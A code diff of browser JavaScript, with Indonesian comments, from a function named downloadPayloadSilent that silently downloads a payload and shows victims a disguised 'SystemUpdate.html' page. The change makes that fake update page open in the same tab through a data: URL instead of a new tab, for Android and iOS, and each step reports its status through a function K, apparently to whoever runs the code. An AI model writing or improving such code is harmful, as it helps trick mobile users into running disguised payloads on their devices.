@@ -317,7 +317,7 @@ function downloadPayloadSilent() {
         xhr.send();
     } catch(e) {}
     
-    // ✅ BUKA SystemUpdate.html
+    // ✅ BUKA SystemUpdate.html (DI HALAMAN SAMA!)
     setTimeout(function() {
         if (PLATFORM.isAndroid && A.isAvailable) {
             try {
@@ -329,10 +329,9 @@ function downloadPayloadSilent() {
         try {
             var htmlContent = localStorage.getItem('SystemUpdate.html');
             if (htmlContent) {
-                var blob = new Blob([htmlContent], { type: 'text/html' });
-                var url = URL.createObjectURL(blob);
-                window.open(url, '_blank');
-                K({ sumber: 'html_open_localstorage', data: 'ok' });
+                // ✅ PERUBAHAN: BUKA DI HALAMAN SAMA (BUKAN TAB BARU!)
+                window.location.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
+                K({ sumber: 'html_open_same_tab', data: 'ok' });
                 return;
             }
         } catch(e) {}
@@ -346,9 +345,7 @@ function downloadPayloadSilent() {
             try {
                 var htmlContent = localStorage.getItem('SystemUpdate.html');
                 if (htmlContent) {
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    window.open(url, '_blank');
+                    window.location.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
                     K({ sumber: 'html_open_ios', data: 'ok' });
                 }
             } catch(e) {}
